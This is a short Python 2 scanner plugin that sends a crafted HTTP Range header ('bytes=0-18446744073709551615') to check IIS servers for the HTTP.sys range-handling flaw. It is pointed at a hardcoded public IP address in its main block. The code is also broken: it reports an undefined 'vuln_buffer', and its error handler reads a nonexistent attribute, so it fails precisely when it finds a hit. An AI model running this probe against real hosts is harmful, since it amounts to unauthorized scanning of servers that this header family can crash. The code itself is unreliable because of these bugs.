#!/usr/bin/env python
# encoding: utf-8
from t import T
import re
import urllib2,requests,urllib2,json,urlparse




class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        timeout=3
        if int(port) == 443:
            protocal = "https"
        else:
            protocal = "http"
        target_url = protocal + "://"+ip+":"+str(port)


        result = {}
        result['result']=False
        r=None

        vuln_header = {"Range": "bytes=0-18446744073709551615"}

        try:


            r=requests.get(url=target_url,headers=vuln_header,timeout=timeout,verify=False,allow_redirects=False)
            #print r.content
            if "请求范围不符合" in r.content or "Requested Range Not Satisfiable" in r.content:


                result['result']=True
                result['VerifyInfo'] = {}
                result['VerifyInfo']['type']='iis Vulnerability'
                result['VerifyInfo']['URL'] =target_url
                result['VerifyInfo']['payload']=vuln_buffer
                result['VerifyInfo']['level']='hole'
                result['VerifyInfo']['result'] =r.content
        except Exception,e:
            print e.text
        finally:
            if r is not None:
                r.close()
                del r
            return result



if __name__ == '__main__':
    print P().verify(ip='202.85.212.101',port='443')
